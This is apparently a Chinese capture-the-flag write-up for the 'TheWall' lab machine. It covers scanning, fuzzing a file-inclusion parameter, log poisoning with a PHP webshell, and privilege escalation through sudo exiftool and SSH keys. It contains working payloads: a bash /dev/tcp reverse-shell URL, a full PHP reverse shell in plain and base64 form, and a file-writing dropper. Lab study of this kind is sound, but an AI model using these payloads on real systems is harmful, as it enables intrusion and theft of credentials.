
|   |   |   |
|---|---|---|
|thewall|easy|Akamai  防火墙、绕过wall、fuzz、文件包含利用、exiftool提权、sudo提权、ssh私钥利用|

# 服务探测
```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p 22,80 192.168.18.238 
```

22，80
### 目录扫描

由于目标靶场安装了Akamai  防火墙，正常的扫描会被拦截。所以使用gobuster扫描的时候增加延时和线程控制
```css
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.18.238 -x php -e --delay 1s -t 1 


http://192.168.18.238/includes.php
```
这里扫描出来了一个文件包含名字的文件，尝试对其进行fuzz 参数。这里发现任何访问的响应都是200和长度为2，所以还需要设置排除项
```c
wfuzz -c --hc=404 --hh=2 -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://192.168.18.238/includes.php?FUZZ=/etc/passwd'


000217299:   200        28 L     41 W       1460 Ch    "display_pag“
```

得到传入的参数为display_page


# GETSHELL
通过bp 爆破了发现利用访问日志记录。

那我们可以尝试写入webshell到日志，然后取包含它

```css
┌──(kali㉿kali)-[~]
└─$ nc 192.168.18.238 80
GET <?php system($_GET['cmd']); ?>


http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&cmd=bash+-c+%27bash+-i+%3E%26/dev/tcp/192.168.44.128/9001+0%3E%261%27
```

获得第一个flag
```c
www-data@TheWall:/home/john$ cat user.txt
cat user.txt
cc5db5e7b0a26e807765f47a006f6221
```

# 使用file_put_contents函数写入shell

```c
nc 192.168.18.238 80 
GET <?php file_put_contents('/var/www/html/a.php',base64_decode($_GET['a'])); ?>
```

访问一下链接：http://192.168.1.226/includes.php?display_page=/var/log/apache2/access.log
然后确定`<?php phpinfo(); ?>`base64编码的代码
```css
http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&a=PD9waHAgcGhwaW5mbygpOyA/Pg==
```
接下来去包含这个文件，如下说明写入成功http://192.168.18.238/a.php
这里我们可以换个思路，将phpinfo代码换成php恢复shell代码。

```c
<?php set_time_limit(0);$ip='192.168.44.128';$port=9002;$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){exit(1);}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);while(1){if(feof($sock)){break;}if(feof($pipes[1])){break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){$input=fread($sock,$chunk_size);fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){$input=fread($pipes[1],$chunk_size);fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){$input=fread($pipes[2],$chunk_size);fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process); ?>

PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7JGlwPScxOTIuMTY4LjQ0LjEyOCc7JHBvcnQ9OTAwMjskY2h1bmtfc2l6ZT0xNDAwOyR3cml0ZV9hPW51bGw7JGVycm9yX2E9bnVsbDskc2hlbGw9J3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7Y2hkaXIoIi8iKTt1bWFzaygwKTskc29jaz1mc29ja29wZW4oJGlwLCRwb3J0LCRlcnJubywkZXJyc3RyLDMwKTtpZighJHNvY2spe2V4aXQoMSk7fSRkZXNjcmlwdG9yc3BlYz1hcnJheSgwPT5hcnJheSgicGlwZSIsInIiKSwxPT5hcnJheSgicGlwZSIsInciKSwyPT5hcnJheSgicGlwZSIsInciKSk7JHByb2Nlc3M9cHJvY19vcGVuKCRzaGVsbCwkZGVzY3JpcHRvcnNwZWMsJHBpcGVzKTtpZighaXNfcmVzb3VyY2UoJHByb2Nlc3MpKXtleGl0KDEpO31zdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLDApO3doaWxlKDEpe2lmKGZlb2YoJHNvY2spKXticmVhazt9aWYoZmVvZigkcGlwZXNbMV0pKXticmVhazt9JHJlYWRfYT1hcnJheSgkc29jaywkcGlwZXNbMV0sJHBpcGVzWzJdKTskbnVtX2NoYW5nZWRfc29ja2V0cz1zdHJlYW1fc2VsZWN0KCRyZWFkX2EsJHdyaXRlX2EsJGVycm9yX2EsbnVsbCk7aWYoaW5fYXJyYXkoJHNvY2ssJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkc29jaywkY2h1bmtfc2l6ZSk7ZndyaXRlKCRwaXBlc1swXSwkaW5wdXQpO31pZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkcGlwZXNbMV0sJGNodW5rX3NpemUpO2Z3cml0ZSgkc29jaywkaW5wdXQpO31pZihpbl9hcnJheSgkcGlwZXNbMl0sJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkcGlwZXNbMl0sJGNodW5rX3NpemUpO2Z3cml0ZSgkc29jaywkaW5wdXQpO319ZmNsb3NlKCRzb2NrKTtmY2xvc2UoJHBpcGVzWzBdKTtmY2xvc2UoJHBpcGVzWzFdKTtmY2xvc2UoJHBpcGVzWzJdKTtwcm9jX2Nsb3NlKCRwcm9jZXNzKTsgPz4=



访问http://192.168.18.238/a.php  反弹shell成功
┌──(kali㉿kali)-[~]
└─$ nc -lnvp  9002

```

如果实战中出网，这个时候反弹shell的方法就没法用了。如果知道根目录的情况下我们可以尝试直接写入webshel​​l
或者
```c
┌──(kali㉿kali)-[~]
└─$ nc 192.168.18.238 80
GET <?php file_put_contents('/var/www/html/a.php',base64_decode($_GET['a'])); ?>

http://192.168.1.226/includes.php?display_page=/var/log/apache2/access.log&a=PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==

http://192.168.1.226/a.php?c=whoami
```

# 提权
```C
sudo -l

 (john : john) NOPASSWD: /usr/bin/exiftool

```

https://medium.com/@josemlwdf/thewall-eb99f02e1502

[Linux CentOS 8.x 生成rsa公私密钥\_linux生成公钥私钥-CSDN博客](https://blog.csdn.net/hkl_Forever/article/details/127422236)

[linux ssh公钥免密码登录 - zqifa - 博客园](https://www.cnblogs.com/zqifa/p/ssh-1.html)


```c
┌──(root㉿kali)-[~/.ssh]
└─# ssh-keygen -t rsa
```

我们在/tmp/下创建一个id_rsa.pub，然后使用exiftool将“id rsa.pub”复制到“authorized_key”中
```c
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8hH4Hco6cXEFfQ93KrvQBQ2T+VFaYsxqjENfNdKJvJkoxQD8sn8/5noKVUiWfqv/bn65uivoNh3cZf8AW1afXI/uAAbIHrjPKZM69cScSg2j1F6pgijwwROtuAQIcdyZdiWD8We1j1d1VrOcYV8DmD3+TUKqxrCwuUC1mzBBs2XebKaUj13saSqUZfvWjEaGwnTpXczZqzuDef5ykw2EQzk6RbZ0vhImR7MmgkpAC26PmWeXMcrdmN52l26YcJT3ERLcmCQjZeYwg06RB+0UmwGK5HfFojHuzRKjfaDjWipbKo065lOGZoCF4R4fuXiFjMbcbMJMvUiEhyBnAD2e8FYRdlXd8bv66+1w1Fmg7z8oGZOfJfY++koUGhTHW7yhVECvGvHuBsBDJqdKVl4I7jBY9z0pAuyeogv3KxjdQpnaCXB47HzTKgGFBfxAqzmvUde7SwrIgjXLJrTPzA7rzJvcso/n+4o+fY73jyKUgbh6P/RYSHSxd5RhFVrhu00M= root@kali
" > /tmp/id_rsa.pub

sudo -u john /usr/bin/exiftool -filename=/home/john/.ssh/authorized_keys /tmp/id_rsa.pub
```

[exiftool | GTFOBins](https://gtfobins.github.io/gtfobins/exiftool/#sudo)

换一个思路读取ssh私钥
```c
sudo -u john /usr/bin/exiftool -filename=/tmp/idrsa /home/john/.ssh/id_rsa

┌──(root㉿kali)-[~/.ssh]
└─# ssh -i id_rsa john@192.168.18.238
```


```C
┌──(root㉿kali)-[~]
└─# ssh john@192.168.18.238

john@TheWall:~$ cat user.txt
cc5db5e7b0a26e807765f47a006f6221
```

# 提权-


我已经使用**scp**将**Linpeas**复制到机器中，如下所示

**豌豆**发现了这一点：
```c
Files with capabilities (limited to 50):
/usr/sbin/tar cap_dac_read_search=ep
```